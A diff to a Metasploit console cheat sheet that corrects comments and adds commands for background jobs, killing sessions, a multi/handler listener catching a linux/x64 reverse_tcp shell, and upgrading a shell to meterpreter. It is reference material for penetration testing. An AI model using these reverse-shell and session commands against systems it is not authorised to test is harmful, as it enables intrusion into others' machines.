@@ -4,16 +4,16 @@ help
 # Search for Something
 search <something>
 
-# Search for Exploit 
+# Search for Exploits 
 search type:exploit <productstring>
 
-# Search for Exploit 
+# Search for Windows Exploits 
 search type:exploit platform:windows <productstring>
 
-# Search for Exploit 
+# Search for Windows Exploits and filter results
 grep <string> search type:exploit platform:windows
 
-# To show all exploits that for a vulnerability
+# To show all exploits for a specific vulnerability
 grep <vulnerability> show exploits
 
 # To select an exploit to use
@@ -37,14 +37,43 @@ set <option> <value>
 # To set setting globally for a selected module 
 setg <option> <value>
 
+# To see a specific variable setting
+get <option>
+
+# View payload that has been set
+get PAYLOAD
+
 # To run the exploit
 exploit
+
+# To run the exploit in background (useful for multi/handler)
+exploit -j
 
 # List Sessions 
 sessions
 
 # Enter in session 2
-sessions 2
+sessions -i 2
 
 # Kill session 1
 sessions -k 1
+
+# Kill all sessions
+sessions -K
+
+# Use a multi/handler reverse shell catcher
+## Note that payload and reverse shell must match
+## e.g., a meterpreter payload must have a listening meterpreter payload
+use exploit/multi/handler
+show payloads                           ;; show payloads
+set payload linux/x64/shell/reverse_tcp ;; set the appropriate payload
+set LHOST <network-interface>           ;; e.g., tun0 or wlan0
+set LPORT 4242
+exploit -j                              ;; wait for shell
+jobs                                    ;; shows background jobs
+;; once inside whatever shell, we can do
+background (or ctrl+z)                  ;; sets the shell in  background
+
+# Transform a generic reverse shell to a meterpreter shell
+## This is equivalent to use post/multi/manage/shell_to_meterpreter
+sessions -u <session-id>
